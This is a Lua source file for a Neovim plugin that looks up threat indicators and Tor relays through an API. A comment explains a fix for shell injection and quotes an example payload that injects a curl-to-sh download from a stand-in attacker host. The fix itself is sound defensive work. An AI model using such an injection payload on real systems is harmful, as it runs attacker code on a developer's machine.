-- DugganUSA Threat Intel Scanner for Neovim
-- Check IPs, domains, hashes, CVEs under cursor against 1M+ IOCs.
--
-- Usage:
--   :DugganUSA           — look up word under cursor
--   :DugganUSA <value>   — look up specific indicator
--   :DugganUSAAipm       — AIPM audit (prompts for domain)
--
-- Setup (lazy.nvim):
--   { "pduggusa/dugganusa-nvim", config = function() require("dugganusa").setup() end }

local M = {}

M.config = {
  api_key = vim.env.DUGGANUSA_API_KEY or "",
  api_url = "https://analytics.dugganusa.com/api/v1",
}


-- ============================================================================
-- SHELL SAFETY (2026-07-19)
--
-- Every request used to be built as a STRING and handed to vim.fn.jobstart().
-- String form executes via `sh -c`, so any shell metacharacter in the indicator
-- was interpreted. M.lookup() even built a shellescape()'d `url` on one line and
-- then discarded it, re-interpolating the raw value on the next.
--
-- The input is vim.fn.expand("<cword>") — the word under the cursor — or a
-- visual selection. This plugin exists to inspect suspicious indicators inside
-- suspicious files, so the attacker controls it exactly when it matters most.
-- A token like:  foo'; curl evil.example/x | sh; echo '
-- executed arbitrary commands as the developer.
--
-- jobstart() with a LIST goes straight to execvp with no shell, so metacharacters
-- can never be interpreted. That removes the whole class rather than escaping it.
--
-- The API key also moved out of argv: it was passed as -H on the command line and
-- therefore readable by any local user via `ps aux`. curl now reads the header
-- from stdin via `--config -`.
-- ============================================================================

local function url_encode(v)
  return (tostring(v or ""):gsub("[^%w%-%._~]", function(c)
    return string.format("%%%02X", string.byte(c))
  end))
end

-- Returns argv (list form — never a string) plus the stdin config carrying the key.
local function curl_argv(path)
  local argv = { "curl", "-s", "--max-time", "20" }
  local stdin_cfg = nil
  if M.config.api_key ~= nil and M.config.api_key ~= "" then
    table.insert(argv, "--config")
    table.insert(argv, "-")
    stdin_cfg = 'header = "Authorization: Bearer ' .. M.config.api_key .. '"\n'
  end
  table.insert(argv, M.config.api_url .. path)
  return argv, stdin_cfg
end

-- jobstart with argv, feeding the key over stdin so it never reaches the process table.
local function curl_start(path, opts)
  local argv, stdin_cfg = curl_argv(path)
  local job = vim.fn.jobstart(argv, opts)
  if job > 0 and stdin_cfg then
    vim.fn.chansend(job, stdin_cfg)
    vim.fn.chanclose(job, "stdin")
  end
  return job
end

function M.setup(opts)
  M.config = vim.tbl_extend("force", M.config, opts or {})

  vim.api.nvim_create_user_command("DugganUSA", function(cmd)
    local value = cmd.args ~= "" and cmd.args or vim.fn.expand("<cword>")
    M.lookup(value)
  end, { nargs = "?" })

  vim.api.nvim_create_user_command("DugganUSAAipm", function()
    vim.ui.input({ prompt = "Domain to audit: " }, function(domain)
      if domain and domain ~= "" then
        local clean = domain:lower():gsub("^https?://", ""):gsub("/.*$", ""):gsub("^www%.", "")
        -- argv form, no shell. `clean` is sanitised but was still interpolated
        -- into a shell string; a domain containing a quote escaped it.
        local aipm_url = "https://aipmsec.com/audit.html?domain=" .. url_encode(clean)
        if vim.ui.open then
          vim.ui.open(aipm_url)
        else
          local opener = vim.fn.has("mac") == 1 and "open" or "xdg-open"
          vim.fn.jobstart({ opener, aipm_url }, { detach = true })
        end
        vim.notify("AIPM audit opened for " .. clean, vim.log.levels.INFO)
      end
    end)
  end, {})

  vim.api.nvim_create_user_command("DugganUSATor", function(cmd)
    local value = cmd.args ~= "" and cmd.args or vim.fn.expand("<cword>")
    M.tor_check(value)
  end, { nargs = "?" })

  vim.api.nvim_create_user_command("DugganUSATorHunt", function()
    M.tor_hunt()
  end, {})

  -- Keymap: <leader>di for lookup, <leader>da for AIPM, <leader>dt for Tor
  vim.keymap.set("n", "<leader>di", ":DugganUSA<CR>", { silent = true, desc = "DugganUSA: look up word under cursor" })
  vim.keymap.set("v", "<leader>di", function()
    local start_pos = vim.fn.getpos("'<")
    local end_pos = vim.fn.getpos("'>")
    local lines = vim.fn.getline(start_pos[2], end_pos[2])
    if #lines == 1 then
      lines[1] = lines[1]:sub(start_pos[3], end_pos[3])
    end
    M.lookup(table.concat(lines, " "))
  end, { desc = "DugganUSA: look up selection" })
  vim.keymap.set("n", "<leader>da", ":DugganUSAAipm<CR>", { silent = true, desc = "DugganUSA: AIPM audit" })
  vim.keymap.set("n", "<leader>dt", ":DugganUSATor<CR>", { silent = true, desc = "DugganUSA: Tor relay check" })
end

function M.lookup(value)
  if not value or value == "" then
    vim.notify("DugganUSA: no indicator under cursor", vim.log.levels.WARN)
    return
  end

  vim.notify("DugganUSA: checking " .. value .. "...", vim.log.levels.INFO)

  curl_start("/search/correlate?q=" .. url_encode(value), {
    stdout_buffered = true,
    on_stdout = function(_, data)
      local raw = table.concat(data, "")
      if raw == "" then return end

      local ok, json = pcall(vim.json.decode, raw)
      if not ok then vim.notify("DugganUSA: API parse error", vim.log.levels.ERROR); return end

      local correlations = (json.data or {}).correlations or {}
      local total_hits = 0
      local parts = {}

      for idx, hits in pairs(correlations) do
        if type(hits) == "table" and #hits > 0 then
          total_hits = total_hits + #hits
          local f = hits[1]
          if idx == "iocs" then
            table.insert(parts, (f.malware_family or f.threat_type or "?") .. " (" .. (f.source or "?") .. ")")
          elseif idx == "block_events" then
            table.insert(parts, "Blocked " .. #hits .. "x")
          elseif idx == "pulses" then
            table.insert(parts, #hits .. " pulse(s)")
          elseif idx == "cisa_kev" then
            table.insert(parts, "CISA KEV")
          elseif idx == "adversaries" then
            table.insert(parts, "APT: " .. (f.name or "?"))
          end
        end
      end

      if total_hits > 0 then
        local summary = table.concat(parts, " · ")
        vim.notify("⚠️  DugganUSA: " .. value .. " — " .. summary .. " (" .. total_hits .. " hits)", vim.log.levels.WARN)
      else
        vim.notify("✅ DugganUSA: " .. value .. " — clean (not in 1.10M+ IOC index)", vim.log.levels.INFO)
      end
    end,
    on_stderr = function(_, data)
      local err = table.concat(data, "")
      if err ~= "" then vim.notify("DugganUSA: " .. err, vim.log.levels.ERROR) end
    end,
  })
end

function M.tor_check(ip)
  if not ip or ip == "" then
    vim.notify("DugganUSA: no IP under cursor", vim.log.levels.WARN)
    return
  end

  vim.notify("DugganUSA: checking Tor relay " .. ip .. "...", vim.log.levels.INFO)

  curl_start("/tor/relays?q=" .. url_encode(ip) .. "&limit=1", {
    stdout_buffered = true,
    on_stdout = function(_, data)
      local raw = table.concat(data, "")
      if raw == "" then return end

      local ok, json = pcall(vim.json.decode, raw)
      if not ok then vim.notify("DugganUSA: API parse error", vim.log.levels.ERROR); return end

      local hits = (json.data or {}).relays or (json.data or {}).hits or {}
      if #hits > 0 and hits[1].address == ip then
        local r = hits[1]
        local flags = type(r.flags) == "table" and table.concat(r.flags, ",") or (r.flags or "")
        vim.notify(
          "🧅 Tor Relay: " .. (r.nickname or "?") .. " | " .. flags ..
          " | " .. (r.country or "?") .. " | " .. (r.asnOrg or "?") ..
          " | BW:" .. (r.bandwidth or "?"),
          vim.log.levels.WARN
        )
      else
        vim.notify("✅ " .. ip .. " is NOT a known Tor relay", vim.log.levels.INFO)
      end
    end,
  })
end

function M.tor_hunt()
  vim.notify("DugganUSA: hunting suspicious Tor relays...", vim.log.levels.INFO)

  curl_start("/tor/hunt", {
    stdout_buffered = true,
    on_stdout = function(_, data)
      local raw = table.concat(data, "")
      if raw == "" then return end

      local ok, json = pcall(vim.json.decode, raw)
      if not ok then vim.notify("DugganUSA: API parse error", vim.log.levels.ERROR); return end

      local relays = (json.data or {}).relays or json.data or {}
      if #relays == 0 then
        vim.notify("No suspicious Tor relays found", vim.log.levels.INFO)
        return
      end

      local lines = { "Suspicious Tor Relays:" }
      for i, r in ipairs(relays) do
        if i > 10 then break end
        table.insert(lines, string.format(
          "  %s | %s | %s | Score:%s",
          r.address or "?", r.nickname or "?", r.country or "?",
          tostring(r.suspicionScore or r.score or "?")
        ))
      end
      vim.notify(table.concat(lines, "\n"), vim.log.levels.WARN)
    end,
  })
end

return M
